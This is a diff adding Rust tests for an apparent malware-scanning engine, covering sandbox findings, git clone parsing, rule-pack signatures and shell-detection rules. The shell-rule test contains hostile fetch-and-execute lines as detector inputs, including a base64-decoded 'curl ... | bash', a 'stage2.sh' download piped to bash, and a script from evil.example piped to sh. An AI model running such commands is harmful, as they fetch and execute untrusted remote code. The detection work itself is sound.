@@ -509,7 +509,7 @@ fn sandbox_findings_classify_behavior() {
     // 不运行任何程序，直接给出“观察到的行为”，验证判定逻辑
     let b = Behavior {
         network: vec![
-            NetEvent { target: "203.0.113.7:1224".into(), request: String::new(), leaked: vec!["TSUBA-DECOY-WALLET".into()] },
+            NetEvent { target: "203.0.113.7:1224".into(), request: String::new(), leaked: vec!["TSUBA-DECOY-WALLET".into()], forwarded: false },
         ],
         new_files: vec!["Library/LaunchAgents/com.x.plist".into(), ".node_modules/axios/index.js".into()],
         ..Default::default()
@@ -550,4 +550,64 @@ fn sandbox_runs_benign_project() {
     assert!(b.output.contains("ok"), "项目应正常启动: {}", b.output);
     assert!(sandbox::findings(&b).is_empty(), "无害项目不应有证据");
     assert_eq!(sandbox::project_start_argv(dir.path()), vec!["node", "index.js"]);
+}
+
+#[test]
+fn clone_dirs_finds_target_directory() {
+    use tsuba_engine::detect::clone_dirs;
+    assert_eq!(clone_dirs("git clone https://github.com/acme/Online_Store.git"), vec!["Online_Store"]);
+    assert_eq!(clone_dirs("git clone git@github.com:acme/shop.git"), vec!["shop"]);
+    assert_eq!(clone_dirs("git clone --depth 1 -b main https://github.com/acme/shop interview"), vec!["interview"]);
+    assert_eq!(clone_dirs("cd ~/code && git clone https://gitlab.com/a/b/"), vec!["b"]);
+    assert_eq!(clone_dirs("gh repo clone acme/shop"), vec!["shop"]);
+    assert_eq!(clone_dirs("gh repo clone acme/shop work -- --depth 1"), vec!["work"]);
+    assert!(clone_dirs("git status").is_empty());
+}
+
+/// 装在家目录里的 npm（fnm / nvm）在沙箱里要能跑：node 解析真实路径时会 lstat 家目录本身，被拒就 EPERM 退出。
+#[test]
+fn sandbox_runs_npm_installed_in_home() {
+    if !sandbox_ready() {
+        return;
+    }
+    let b = sandbox::run_script("command -v npm >/dev/null || exit 0; npm --version", "/bin/bash", Duration::from_secs(30)).unwrap();
+    assert!(!b.output.contains("EPERM"), "npm 在沙箱里被拒绝访问：{}", b.output);
+    assert_eq!(b.exit_code, Some(0), "{}", b.output);
+}
+
+#[test]
+fn rule_pack_signature() {
+    use tsuba_engine::intel::tsuba::{public_key, sign, verify};
+    let (secret, other) = ([7u8; 32], [9u8; 32]);
+    let (yar, toml) = ("rule a { condition: true }", "version = \"2099.1.1\"\n");
+    let sig = sign(yar, toml, &secret);
+    let pk = public_key(&secret);
+    assert!(verify(yar, toml, &sig, &[pk.as_str()]).is_ok());
+    // 改一个字（比如删掉一条规则）签名就对不上
+    assert!(verify("rule a { condition: false }", toml, &sig, &[pk.as_str()]).is_err());
+    assert!(verify(yar, "version = \"2099.1.2\"\n", &sig, &[pk.as_str()]).is_err());
+    // 别人的钥匙签的不认
+    assert!(verify(yar, toml, &sign(yar, toml, &other), &[pk.as_str()]).is_err());
+    assert!(verify(yar, toml, "not-hex", &[pk.as_str()]).is_err());
+    // 没有信任的公钥时什么都不认
+    assert!(verify(yar, toml, &sig, &[]).is_err());
+}
+
+/// 真实扩展里的误报（tsuba eval 量出来的），收窄规则后不再命中；攻击写法照样命中。
+#[test]
+fn shell_rules_skip_benign_extension_patterns() {
+    let rule_hits = |t: &str| rules::scan_text(t, "x.js").into_iter().map(|f| f.rule).filter(|r| !r.is_empty()).collect::<Vec<_>>();
+    // Cursor remote-containers：把自己写进 stdin 的数据解码执行
+    assert!(rule_hits(r#"spawn("bash",["-c","cat | (base64 -d 2>/dev/null || base64 -D || true) | bash"])"#).is_empty());
+    // Pylance：在 JS 里拼 Node.js 官方下载地址
+    assert!(rule_hits("function p8(e){return`https://nodejs.org/dist/${e.version}/node-${e.version}.tar.gz`}").is_empty());
+    // python-envs：官方 uv 安装脚本
+    assert!(rule_hits(r#"args:["-c","curl -LsSf https://astral.sh/uv/install.sh | sh"]"#).is_empty());
+
+    assert!(rule_hits("echo Y3VybCBodHRwOi8vMS4yLjMuNC94IHwgYmFzaA== | base64 -d | bash").contains(&"tsuba_base64_to_shell".to_string()));
+    assert!(rule_hits("base64 -d payload.b64 | bash").contains(&"tsuba_base64_to_shell".to_string()));
+    assert!(rule_hits("curl -sO https://nodejs.org/dist/v20.11.0/node.tar.gz").contains(&"tsuba_standalone_node".to_string()));
+    assert!(rule_hits("curl -s https://zeff-meet.app/stage2.sh | bash").contains(&"tsuba_multistage_download".to_string()));
+    // 官方地址和陌生地址混在一起时照样提醒
+    assert!(rule_hits("curl -s https://astral.sh/x.sh https://evil.example/y.sh | sh").contains(&"tsuba_multistage_download".to_string()));
 }
